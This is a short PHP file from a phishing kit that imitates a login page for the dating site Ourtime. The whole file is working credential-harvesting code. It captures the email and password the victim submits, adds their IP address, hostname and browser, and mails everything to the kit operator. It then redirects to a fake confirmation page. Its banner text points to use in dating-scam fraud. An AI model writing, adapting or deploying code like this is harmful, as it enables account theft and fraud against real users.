<?php

include('./blocker.php');
include('./redirect.php');
$ip = getenv("REMOTE_ADDR");  
$hostname = gethostbyaddr($ip);
$user = $_POST['username'];
$pass = $_POST['password'];
$message ="
•••••••••••••••© Ourtime 4 Vairus O. Family ©•••••••••••••••
Email Address: ".$user."
Password: ".$pass."
•••••••••••••••••••••••© Desk Info ©••••••••••••••••••••••••
IP: http://www.ip-score.com/checkip/".$ip."
Browser: ".$_SERVER['HTTP_USER_AGENT']."
Host: ".$hostname."
•••••••••••••••••••^^^Happy E-Whoring^^^•••••••••••••••••••"; 

include('./mailer.php');
$subject = "Ourtime (".$ip.")"; 
$headers = "From:  Vairus O.<updates@ourtimewhorers.com>"; 
mail($send,$subject,$message,$headers); 

$header = "confrm_id.php?cmd=_login-run&success=".md5(gmdate('r'));;

header("Location: $header");

?>